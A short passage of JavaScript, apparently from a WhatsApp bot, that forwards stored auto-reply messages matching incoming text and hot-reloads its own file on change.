if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
conn.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
